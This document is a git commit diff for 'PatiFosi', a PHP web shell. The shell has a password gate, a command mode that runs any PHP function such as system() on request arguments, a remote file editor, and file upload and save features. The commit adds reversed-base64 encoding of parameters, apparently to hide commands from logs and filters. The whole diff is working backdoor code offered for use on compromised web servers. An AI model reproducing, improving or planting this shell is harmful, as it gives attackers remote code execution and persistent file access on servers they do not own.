0744a176111e451cba2692bbb4a3e7636776da3f
milio48 <31167054+milio48@users.noreply.github.com>
2018-06-20 19:59:54 +0700

    encode & bug fixed
    1. add encode fiture
    2. image custom
    3. bug fixed

--- patifosi.php
+++ patifosi.php
@@ -7,11 +7,13 @@ header("X-XSS-Protection: 0");
 $param = 'login';                             // login input
 $pw    = 'e5e32f8c9a2e843080f5176871e8cd32'; // md5 password default = gans
 $inDir = true;                             // true or false, to enable input dir
-$out   = 'exit;';                          // string, not login
+$out   = 'exit;';                         // string, not login
+$enc   = true;                           // js must enabled, editor & upload not encoded
+$img   = 'https://github.com/milio48/patifosi/raw/master/patifosi.gif';
 
-// deklarasi variable
-$dir    = getcwd();
+// variable
 $dirGet = $_GET['dir'];
+$dirGET = $_GET['dir'];
 $file   = $_GET['file'];
 $func   = $_GET['func'];
 $arg    = $_GET['arg'];
@@ -20,6 +22,24 @@ $type   = $_GET['type'];
 $pass   = $_GET[$param];
 $md5    = md5("$_GET[$param]");
 $host   = $_SERVER['HTTP_HOST'];
+$uplto  = $_POST['uplto'];
+$saveto = $_POST['saveto'];
+$file   = $_POST['file'];
+
+// decode
+function dec($str){
+    $str = base64_decode(strrev("$str"));
+    return str_replace('=', '-', "$str");
+}
+
+if($enc == true && isset($dirGet)){
+    $dirGet = dec($dirGet);
+    $func   = dec($func);
+    $arg    = dec($arg);
+    $uplto  = dec($uplto);
+    $saveto = dec($saveto);
+    $file   = dec($file);
+};
 
 // login
 if($md5 !== $pw){
@@ -32,7 +52,6 @@ $w = array("milio48", "pescyte", "idbte4m", "javcode", "zerobyte", "idxSmg", "pa
  // sorry for bad code //
 // just for fun       //
 
-
 // checked type
 if($type){
   $typeChecked = "checked";
@@ -40,22 +59,42 @@ if($type){
 
 // chdir
 if($dirGet){
-  $dir = "$dirGet";
-  chdir($dir);
+  chdir($dirGet);
+};
+
+// directory
+$dirNow = getcwd();
+
+// button encode
+if($enc){
+  $encButton = 'enc()';
+}else{
+  $encButton = '';
 };
 
 // input dir
 if($inDir){
-  $inputDir = "<th style='display:inline-block'>dir<br><input type='text' name='dir' value='$dir' placeholder='/var/www/html'> </th>";
+  $inputDir = "<th style='display:inline-block'>dir<br><input class='encode' type='text' name='dir' value='$dirNow' placeholder='/var/www/html'> </th>";
 } else {
-  $Hidinput = "<input type='hidden' name='dir' value='$dir'>";
+  $Hidinput = "<input class='encode' type='hidden' name='dir' value='$dirNow'>";
 };
 
+// codemirror library in mode=edit
+if($mode == edit){
+  $codemirror = "
+  <script src='http://codemirror.net/lib/codemirror.js'></script>
+  <link rel='stylesheet' href='http://codemirror.net/lib/codemirror.css'>
+  <script src='http://codemirror.net/mode/javascript/javascript.js'></script>
+  <link rel='stylesheet' href='http://codemirror.net/theme/monokai.css'>
+  <script src='https://codemirror.net/addon/edit/matchbrackets.js'></script>
+  ";
+};
 
 // header html
 echo "<html>
 <head>
 <title>PatiFosi</title>
+<link rel='icon' href='$img' type='image/gif'>
 <style>
 #clear { text-decoration: none; }
 .shadow {
@@ -65,26 +104,37 @@ echo "<html>
 }
 input { background-color: #ffffff; color: #2f3542; }
 </style>
-<script src='http://codemirror.net/lib/codemirror.js'></script>
-<link rel='stylesheet' href='http://codemirror.net/lib/codemirror.css'>
-<script src='http://codemirror.net/mode/javascript/javascript.js'></script>
-<link rel='stylesheet' href='http://codemirror.net/theme/monokai.css'>
-<script src='https://codemirror.net/addon/edit/matchbrackets.js'></script>
+$codemirror
+
+<script>
+function rev(str) {
+    return str.split('').reverse().join('');
+}
+
+function enc() {
+    var x = document.getElementsByClassName('encode');
+    var i;
+    for (i = 0; i < x.length; i++) {
+        x[i].value = rev(btoa(x[i].value)).replace('=', '-');
+    }
+}
+</script>
 </head>
 
 <body style='padding:5%; padding-top:2%; border: 3px solid #2f3542; font-family: Arial, Helvetica, sans-serif; background:#f1f2f6;'>
 <center><h1 style='color:#2f3542'>PatiFosi</h1></center>
 <a style='font-size:10; color:#ff4757'>$host</a>
 <a style='font-size:10; color:#a4b0be'>@</a>
-<a style='font-size:10; color:#2f3542'>$dir</a>
-<a style='font-size:10; color:#ff4757' href='?$param=$pass&mode=command'>[Home]</a><center>
+<a style='font-size:10; color:#2f3542'>$dirNow</a>
+<a style='font-size:10; color:#ff4757' href='?$param=$pass'>[Home]</a><center>
 <div style='background-color: #ff6b81'>
-<a id='clear' style='color:#57606f' href='?$param=$pass&mode=command&dir=$dir'>[command] - </a>
-<a id='clear' style='color:#57606f' href='?$param=$pass&mode=edit&dir=$dir'>[edit] - </a>
-<a id='clear' style='color:#57606f' href='?$param=$pass&mode=about&dir=$dir'>[about] </a>
+<a id='clear' style='color:#57606f' href='?$param=$pass&mode=command&dir=$dirGET'>[command] - </a>
+<a id='clear' style='color:#57606f' href='?$param=$pass&mode=edit&dir=$dirGET'>[edit] - </a>
+<a id='clear' style='color:#57606f' href='?$param=$pass&mode=about&dir=$dirGET'>[about] </a>
 </div>
 <br><br>
 ";
+
 
 // mode command
 if ($mode == "command") {
@@ -95,9 +145,9 @@ if ($mode == "command") {
           $Hidinput
           <tr>
           $inputDir
-            <th style='display:inline-block'>func<br><input type='text' name='func' value='$_GET[func]' placeholder='system'> </th>
-            <th style='display:inline-block'>arg<br><input type='text' name='arg' value='$_GET[arg]' placeholder='ls'>  </th> 
-            <td><br><input type='checkbox' name='type' value='checked' $typeChecked >array   <input type='submit' value='Submit' style='background-color: #57606f;color: #f1f2f6;'>
+            <th style='display:inline-block'>func<br><input class='encode' type='text' name='func' value='$func' placeholder='system'> </th>
+            <th style='display:inline-block'>arg<br><input class='encode' type='text' name='arg' value='$arg' placeholder='ls'>  </th> 
+            <td><br><input type='checkbox' name='type' value='checked' $typeChecked >array   <input onclick='$encButton' type='submit' value='Submit' style='background-color: #57606f;color: #f1f2f6;'>
           </td>
           </tr>
         </table>
@@ -106,10 +156,10 @@ if ($mode == "command") {
       <pre style='background:#dfe4ea; color: #2f3542; border-right: 6px solid #ced6e0;'>";
       
           if($type == 'checked'){
-          echo "<i>var_dump($func($arg);</i><br>";
+          echo "<i>var_dump($func($arg));</i><br>";
           @var_dump($func($arg));
         } else {
-          echo "<i>die($func($arg);</i><br>";
+          echo "<i>die($func($arg));</i><br>";
           @die($func($arg));
         }
 
@@ -125,9 +175,9 @@ if ($mode == "command") {
           $Hidinput
           <tr>
           $inputDir
-            <th style='display:inline-block'>func<br><input type='text' name='func' value='$_GET[func]' placeholder='file_get_contents'> </th>
-            <th style='display:inline-block'>arg<br><input type='text' name='arg' value='$_GET[arg]' placeholder='file.php'>  </th> 
-            <td><br><input type='checkbox' name='type' value='ob' $typeChecked>ob   <input type='submit' value='Submit' style='background-color: #57606f;color: #f1f2f6;'>
+            <th style='display:inline-block'>func<br><input class='encode' type='text' name='func' value='$func' placeholder='file_get_contents'> </th>
+            <th style='display:inline-block'>arg<br><input class='encode' type='text' name='arg' value='$arg' placeholder='file.php'>  </th> 
+            <td><br><input type='checkbox' name='type' value='ob' $typeChecked>ob   <input onclick='$encButton' type='submit' value='Submit' style='background-color: #57606f;color: #f1f2f6;'>
           </td>
           </tr>
         </table>
@@ -137,7 +187,7 @@ if ($mode == "command") {
       <button class='shadow' type='button' onclick='full()' style='border-radius: 50%; border: none; background-color: #2ed573; color: #f1f2f6; text-align:right'>_</button>
       <button class='shadow' type='button' onclick='reset()' style='border-radius: 50%; border: none; background-color: #ff4757; color: #f1f2f6; text-align:right'>_</button>
       <br></div>
-      <form  method='post' action='?$param=$pass&mode=edit&func=$_GET[func]&arg=$_GET[arg]&dir=$dir&type=$type' enctype='multipart/form-data'>
+      <form  method='post' action='?$param=$pass&mode=edit&dir=$dirGET&type=$type' enctype='multipart/form-data'>
       <div class='shadow'><textarea id='codemirror' name='code' style='width:100%; height: 50%;'>";
    // codemirror
       if(!empty($_GET['func']) && !empty($_GET['arg'])){
@@ -155,9 +205,9 @@ if ($mode == "command") {
 
     <table style='width:100%'>
     <tr style='text-align:center'>
-    <th style='display:inline-block; padding-right:10%; padding-left:10%;'>upload<br><input type='text' name='uplto' value='$_POST[uplto]' placeholder='$dir'><br><input type='file' name='datupload' style='border: 1px solid #dfe4ea; background:#f1f2f6;'><br><input type='submit' name='uploadsubmit' value='upload' style='background-color: #57606f;color: #f1f2f6;'>
+    <th style='display:inline-block; padding-right:10%; padding-left:10%;'>upload<br><input class='encode' type='text' name='uplto' value='$uplto' placeholder='$dirNow'><br><input type='file' name='datupload' style='border: 1px solid #dfe4ea; background:#f1f2f6;'><br><input onclick='$encButton' type='submit' name='uploadsubmit' value='upload' style='background-color: #57606f;color: #f1f2f6;'>
     </th>
-    <th style='display:inline-block; padding-left:10%; padding-right:10%;'>save<br><input type='text' name='saveto' value='$_POST[saveto]' placeholder='$dir'><br><input type='text' name='file' value='$file' placeholder='file.php'><br><input type='submit' name='savesubmit' value='save' style='background-color: #57606f;color: #f1f2f6;'>
+    <th style='display:inline-block; padding-left:10%; padding-right:10%;'>save<br><input class='encode' type='text' name='saveto' value='$saveto' placeholder='$dirNow'><br><input class='encode' type='text' name='file' value='$file' placeholder='file.php'><br><input onclick='$encButton' type='submit' name='savesubmit' value='save' style='background-color: #57606f;color: #f1f2f6;'>
     </form></th>
     </tr>
     </table>
@@ -188,16 +238,22 @@ if ($mode == "command") {
     ";
     echo "<center><hr style='border-top: 1px solid #dfe4ea' width='90%'><h4>";
     if(isset($_POST['savesubmit'])){
-      $files = $_POST['file'];
-      @chdir($_POST['saveto']);
-      $write = file_put_contents($_POST['file'], $_POST['code']);
+      if(!chdir($saveto)){
+        die("<mark style='background: #ffffff'><a style='color:#ff4757'> directory not exist");
+      };
+
+      $write = file_put_contents($file, $_POST['code']);
 		  if($write) {
-			  die("<mark style='background: #ffffff'><a style='color:#2ed573'> saved $files");
+			  die("<mark style='background: #ffffff'><a style='color:#2ed573'> saved $file");
 		  } else {
 			  die("<mark style='background: #ffffff'><a style='color:#ff4757'> failed save");
-		  }
+      }
+
     } elseif(isset($_POST['uploadsubmit'])){
-      @chdir($_POST['uplto']);
+      if(!chdir($uplto)){
+        die("<mark style='background: #ffffff'><a style='color:#ff4757'> directory not exist");
+      };
+
       $uploadname = $_FILES['datupload']['name'];
       $uploadtmp = $_FILES['datupload']['tmp_name'];
       $write = copy($uploadtmp, $uploadname);
@@ -208,15 +264,16 @@ if ($mode == "command") {
 		  }
     };
 
+
 // mode about
   } elseif ($mode == "about") {
     echo '</center><pre style="background:#dfe4ea; color: #2f3542; border-right: 6px solid #ced6e0;"><i>var_dump($w);</i><br>';
     echo var_dump($w);
   } else {
-      echo "<img src='http://iso.ugo.si/files/patifosi.gif'><br><br>what ar u doin?";
-      echo "<script>
+      echo "<img src='$img'><br>what ar u doin?<br><br>
+      <noscript><i>javascript isn't running</i></noscript><script>
       if(!navigator.onLine) {
-        alert('u must connect internet or download d offline package for best experience');
+        alert('u must connect internet for best experience');
       }
       </script>";
 };
